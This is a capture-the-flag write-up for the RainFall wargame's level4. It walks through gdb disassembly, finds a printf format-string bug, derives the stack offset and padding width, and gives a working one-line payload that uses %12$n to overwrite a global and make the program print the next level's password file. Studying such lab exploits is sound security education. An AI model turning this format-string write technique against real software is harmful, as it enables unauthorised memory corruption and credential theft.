# Way to level5

When we enter the shell `level4`, there is one excutable file which is `level4`.
It maybe same as previous level.
```bash
level4@RainFall:~$ ./level4
dada
dada
```

Let's see it more detail.

```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
(gdb) disassemble p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret    
End of assembler dump.
(gdb) disassemble n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret    
End of assembler dump.
```

## 0. Function chain: main → n → p

The program is split across three functions. `main` (`0x080484ad`) does nothing but
`call   0x8048457 <n>`. Inside `n`, `fgets` reads up to `0x200` bytes into the buffer
at `-0x208(%ebp)` (`0x0804847a`), then `n` immediately passes that same buffer to
`p` via `call   0x8048444 <p>` (`0x08048488`). `p` takes its first argument
`0x8(%ebp)` and feeds it straight into `printf@plt` (`0x08048450`) — so the real
`printf(buf)` call that we abuse lives in `p`, with our data routed there as
`main → n(fgets buf) → p(buf) → printf(buf)`. This is the classic format-string
vulnerability: our input *is* the format string.

The goal is the branch at `n+54`..`n+73`: `n` loads `0x8049810` and compares it to
`cmp $0x1025544` (`0x08048492`). Only if `*(0x8049810) == 0x1025544` does it fall
through to `system(0x8048590)`. So we must **write the value `0x1025544` into the
address `0x8049810`** using the format string alone.

## 1. Finding the offset (deriving "12")

We put `AAAA` (= `0x41414141`) at the front of the input as a marker, then dump the
stack slots `printf` consumes with a run of `%x`. The marker tells us which slot
holds the start of our own buffer.

```bash
level4@RainFall:~$ ./level4
AAAA%x %x %x %x %x %x %x %x %x %x %x %x 
AAAAb7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 
```

Numbering each `%x` output:

| # | value | # | value |
|---|-----------|----|-----------|
| 1 | b7ff26b0  | 7  | 804848d   |
| 2 | bffff784  | 8  | bffff540  |
| 3 | b7fd0ff4  | 9  | 200       |
| 4 | 0         | 10 | b7fd1ac0  |
| 5 | 0         | 11 | b7ff37d0  |
| 6 | bffff748  | 12 | **41414141** |

`41414141` first appears at the **12th** `%x`. That means the 12th argument slot
`printf` reads is the very first 4 bytes of our input buffer. Therefore if we place
a target *address* in those first 4 bytes, the directive `%12$n` will write to that
address. This is the link between "offset 12" and "`%12$n` writes to our chosen
address."

## 2. Why `%12$n` (direct parameter access) instead of positional padding

A positional format string would be `%x%x...%x%n` — eleven `%x` to walk past slots
1..11, then `%n` landing on slot 12. The problem: `%n` writes the number of
characters printed *so far*, so we would have to account for the exact, variable
width of all eleven leaked values (`b7ff26b0` is 8 chars, `200` is 3 chars, `0` is
1 char, …). Those lengths are not under our control and change between runs, so the
final count is impossible to pin to an exact value.

`%12$n` (direct parameter access) solves this: it jumps straight to the 12th
argument **without printing slots 1..11 at all**. Nothing from the skipped slots
contributes to the character count, so the only output before the `%n` is whatever
*we* emit. That gives us full, deterministic control of the number `%n` stores.

> Contrast with level3: there the buffer sat at **offset 4**, so a short positional
> payload like `%044x%n` (pad to a known width, then `%n` at slot 4) was enough —
> few enough leading slots that the width could be absorbed into one padded `%x`.
> At offset 12 that approach is impractical, which is exactly why level4 needs the
> `%N$n` form.

## 3. Computing the write value

The branch requires `*(0x8049810) == 0x1025544`. Convert the target to decimal:

```
0x1025544 = 1*16^6 + 0x025544
          = 16,777,216 + 152,900
          = 16,930,116   (decimal)
```

`%n` writes the count of characters printed before it. Our payload prints:

1. the 4-byte address `\x10\x98\x04\x08` → **4 characters**, then
2. a padded hex field `%016930112x` → **16,930,112 characters**.

So the total before `%12$n` is:

```
4 + 16,930,112 = 16,930,116 = 0x1025544  ✓
```

Hence the field width is `16,930,116 − 4 = 16,930,112`, giving `%016930112x`.

## 4. Width specifier vs. input length (why fgets' 0x200 limit is fine)

It looks like we are writing 16 million bytes, but we are not. `%016930112x` is a
*width specifier*: the literal text `%016930112x` is only ~12 bytes of **input**,
while it instructs `printf` to emit ~16 million characters of **output** (zero
padding). `fgets` was called with `movl $0x200,0x4(%esp)` (`0x08048469`), i.e. a
512-byte cap — but that cap applies only to the length of the *input* we type. The
whole payload (`\x10\x98\x04\x08` + `%016930112x` + `%12$n`) is well under 512
bytes, so it passes `fgets` intact; the 16-million-character blowup happens entirely
inside `printf`'s output, which `fgets` does not constrain.

## 5. Building and firing the payload

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08%016930112x%12$n"' | ./level4
```

- `\x10\x98\x04\x08` — the target address `0x8049810` in little-endian, landing in
  slot 12 (the first 4 bytes of our buffer).
- `%016930112x` — prints 16,930,112 padding characters so the running count reaches
  exactly `0x1025544` by the time `%n` fires.
- `%12$n` — directly addresses slot 12 and writes the count into `*(0x8049810)`.

When we launch it we get a **tremendous result** — this flood of zeros is precisely
the 16,930,112 characters of `0`-padding emitted by `%016930112x`:

```bash
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 [...]
REMOVED
```

The last line is the password for level5.

## 6. Why the password prints without entering a shell (the level3 contrast)

The decisive difference from level3 is **what `system` is called with**.

- **level3**: `system("/bin/sh")` — launches an *interactive* shell. Because our
  input arrives via a pipe, stdin closes immediately and the shell exits before we
  can type; we had to keep stdin open with a `cat` trick (e.g.
  `(python -c '...'; cat) | ./level3`) to interact.
- **level4**: `system(0x8048590)`, and that string is **not** a shell:

```gdb
(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"
```

So `system` runs `cat` directly on the password file as a one-shot command. There is
no interactive prompt to keep alive — no `cat` trick, no trailing hyphen, nothing to
hold stdin open. The program does all the work itself, which is why
`python -c '...' | ./level4` alone is enough to print the password on the last line.

## ASLR note

This exploit does not depend on the stack layout varying between runs. It writes to
a **fixed `.bss` address `0x8049810`** (hard-coded in the binary's `cmp`), and reaches
the format argument with **direct parameter access `%12$n`** rather than any absolute
stack address. Because no leaked stack pointer is reused as a write target, stack
ASLR is irrelevant here — the payload is identical and reliable regardless of it.
